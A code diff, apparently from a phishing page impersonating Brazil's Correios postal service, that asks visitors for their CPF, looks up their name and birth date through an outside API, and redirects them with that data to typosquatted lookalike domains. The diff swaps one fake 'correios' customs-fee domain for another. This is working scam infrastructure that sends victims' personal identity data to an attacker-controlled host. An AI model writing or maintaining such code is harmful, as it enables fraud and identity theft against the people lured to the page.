@@ -259,7 +259,7 @@ Digite seu CPF para rastreamento.
         }
 
         const apiUrl = `https://encurtaapi.com/api/typebot?cpf=${cpf}`;
-        const fallbackUrl = `https://wvwcorreios-taxa.online/2`;
+        const fallbackUrl = `https://wwwcorreios-alfandega.netlify.app/2`;
 
         let timeout = false;
 
@@ -287,7 +287,7 @@ Digite seu CPF para rastreamento.
                 nasc = new Date(nasc).toLocaleDateString('pt-BR');
             }
 
-            window.location.href = `https://wvwcorreios-taxa.online/2/?nome=${encodeURIComponent(nome)}&cpf=${cpf}&nascimento=${encodeURIComponent(nasc)}`;
+            window.location.href = `https://wwwcorreios-alfandega.netlify.app/2/?nome=${encodeURIComponent(nome)}&cpf=${cpf}&nascimento=${encodeURIComponent(nasc)}`;
         } catch (error) {
             console.error('Erro ao acessar a API, redirecionando para link alternativo:', error);
             if (!timeout) {
